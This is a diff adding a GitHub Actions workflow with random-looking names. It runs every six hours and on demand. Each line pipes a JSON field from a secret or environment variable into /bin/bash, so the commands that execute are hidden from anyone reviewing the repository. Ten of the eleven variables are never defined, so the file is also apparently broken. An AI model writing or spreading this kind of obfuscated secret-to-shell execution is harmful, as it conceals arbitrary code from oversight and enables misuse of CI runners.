@@ -1,0 +1,28 @@
+name: peoplehaokanduo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: peoplehaokanduo
+        env:
+          hcma58124: ${{ secrets.hcma58124 }}
+        run: |
+          echo $hcma58124 | jq -r .eg0 | /bin/bash
+          echo $pcpm6079 | jq -r .kqhw68932 | /bin/bash
+          echo $xhjue0844 | jq -r .tlqph99600 | /bin/bash
+          echo $ioaxf390 | jq -r .ywzn9 | /bin/bash
+          echo $gcv8 | jq -r .b25777 | /bin/bash
+          echo $xutzo34 | jq -r .twk8850 | /bin/bash
+          echo $rnosq229 | jq -r .sskv1033 | /bin/bash
+          echo $bnrye36 | jq -r .cmog28558 | /bin/bash
+          echo $rr8313 | jq -r .tlg38381 | /bin/bash
+          echo $emvc817 | jq -r .bshbp27 | /bin/bash
+          echo $bqbz6 | jq -r .wikjl77527 | /bin/bash
+
